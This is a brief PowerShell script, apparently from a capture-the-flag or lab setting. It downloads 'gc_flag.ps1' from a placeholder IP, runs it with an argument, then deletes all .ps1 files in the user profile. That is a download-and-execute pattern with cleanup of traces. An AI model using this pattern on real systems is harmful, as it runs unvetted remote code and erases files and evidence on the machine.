# Define the IP address (replace with the actual IP)
$IP = "192.168.1.1" 

# Download the gc_flag.ps1 file to the Administrator's directory
Invoke-WebRequest -Uri "http://$IP/gc_flag.ps1" -OutFile "$env:USERPROFILE\gc_flag.ps1"

# Call the gc_flag.ps1 script with an argument
& "$env:USERPROFILE\gc_flag.ps1" $args[0]

# Remove all .ps1 files from the Administrator's directory
Remove-Item "$env:USERPROFILE\*.ps1"
